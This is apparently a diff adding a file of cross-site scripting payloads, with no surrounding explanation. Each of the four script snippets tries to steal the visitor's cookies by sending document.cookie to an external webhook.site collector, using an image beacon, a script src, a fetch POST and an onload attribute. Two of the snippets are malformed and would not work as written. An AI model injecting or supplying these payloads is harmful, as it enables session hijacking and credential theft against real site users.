@@ -1,0 +1,19 @@
+<script>
+document.write("<img src='https://webhook.site/415d9a02-0ed8-42a6-8737-b51b5792ffbb?c="+document.cookie+"'/>");
+</script>
+
+<script src="https://webhook.site/415d9a02-0ed8-42a6-8737-b51b5792ffbb?c=+document.cookie+"></script>
+
+
+<script>
+fetch("https://webhook.site/415d9a02-0ed8-42a6-8737-b51b5792ffbb",{
+method:"POST",
+mode: "no-cors",
+body:document.cookie
+});
+</script>
+
+<script onload="https://webhook.site/415d9a02-0ed8-42a6-8737-b51b5792ffbb?c='+document.cookie+'">
+</script>
+
+
